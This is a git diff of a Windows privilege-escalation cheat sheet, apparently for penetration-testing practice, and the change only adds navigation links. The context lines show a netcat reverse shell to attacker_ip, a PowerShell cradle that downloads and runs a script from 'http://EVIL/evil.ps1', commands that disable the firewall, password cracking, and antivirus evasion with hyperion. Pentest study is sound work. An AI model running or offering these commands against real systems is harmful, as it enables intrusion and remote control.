@@ -38,6 +38,8 @@ C:\Windows\System32/license.rtf //for Windows 7
 C:\Windows\System32\eula.txt //for Windows XP 
 ```
 
+[Back](#summary)
+
 ## Cracking Passwords
 * Google it
 * Search on hashkiller.co.uk
@@ -45,6 +47,8 @@ C:\Windows\System32\eula.txt //for Windows XP
 ```
 john textfile
 ```
+
+[Back](#summary)
 
 ## RCE to Shell
 * Getting a shell in limited interpreters
@@ -60,6 +64,8 @@ $ nc.exe -Lp 31337 -vv -e cmd.exe
 $ nc.exe attacker_ip attacker_port -e cmd.exe
 ```
 * [Invoke Powershell](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
+
+[Back](#summary)
 
 ## Useful commands
 * Add a new user
@@ -89,6 +95,8 @@ netsh firewall set service remotedesktop enable
 ```
 $ netsh firewall set opmode disable
 ```
+
+[Back](#summary)
 
 ## Transfer files
 * bitsadmin
@@ -143,6 +151,8 @@ echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"
 //get rid of single quotes and pipe it - ippsec bastard video 23:10
 echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
 ```
+
+[Back](#summary)
 
 ## Process
 - systeminfo
@@ -375,6 +385,9 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 	$ netsh firewall show config
 	```
 
+
+[Back](#summary)
+
 ## Bypassing AV
 * Textbook
 ```
@@ -393,16 +406,22 @@ $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 
 ```
 
+[Back](#summary)
+
 ## Automated Tools
 * [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 * [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
 * [Sherlock](https://github.com/rasta-mouse/Sherlock)
+
+[Back](#summary)
 
 ## Resources
 * [CHECKLIST](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
 * [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 )
 * [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)
+
+[Back](#summary)
 
 ## Nothing is working --> SOS
 * [Calm down](https://www.youtube.com/watch?v=F28MGLlpP90)
@@ -412,3 +431,5 @@ $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 	* Try to add rdp access
 	* RDP by guessing credentials
 * Google anything running as system 
+
+[Back](#summary)
